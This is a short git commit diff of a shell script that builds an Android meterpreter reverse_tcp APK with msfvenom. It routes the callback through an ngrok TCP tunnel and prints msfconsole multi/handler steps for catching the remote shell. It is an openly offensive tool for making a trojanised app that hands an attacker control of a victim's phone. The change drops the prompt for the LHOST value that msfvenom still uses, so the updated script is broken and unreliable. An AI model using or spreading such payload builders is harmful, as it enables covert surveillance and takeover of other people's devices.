2e82da102bdfe3c550c724ae11565c2a8335eea7
Raj hackers <153776272+Rajhackers@users.noreply.github.com>
2023-12-14 05:18:21 +0530

    Update Port forwarding .sh

--- Port forwarding .sh
+++ Port forwarding .sh
@@ -1,6 +1,5 @@
 clear
-read -p "Enter ngrok ip: " n1
-read -p "Enter ngrok port: " n2
+read -p "Enter ngrok tcp port: " n2
 read -p "Enter payload name: " n3
 read -p "saved payload path: " n4
 
@@ -8,6 +7,7 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=$n1 LPORT=$n2 -o $n3.apk
 
 mv $n3.apk $n4
 echo "
+         ./ngrok tcp $n2
          msfconsole
         use exploit/multi/handler
         set payload android/meterpreter/reverse_tcp
